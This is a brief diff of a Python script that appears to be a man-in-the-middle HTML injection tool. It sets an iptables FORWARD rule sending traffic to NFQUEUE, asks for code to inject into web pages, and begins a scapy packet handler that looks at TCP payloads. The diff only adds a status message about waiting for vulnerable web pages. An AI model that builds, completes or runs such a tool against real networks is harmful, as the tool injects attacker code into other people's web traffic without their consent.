@@ -46,6 +46,7 @@ def mpack(packet, load):
     return packet
 subprocess.call("sudo iptables -I FORWARD -j NFQUEUE --queue-num 0", shell=True)
 userval = input("[Required] --> Please paste the code to be injected in HTML pages: ")
+print("[Waiting] --> Waiting for vulnerable Web pages .......")
 def packinjector(packet):
     spacket =sc.IP(packet.get_payload())
     if spacket.haslayer(sc.Raw) and spacket.haslayer(sc.TCP):
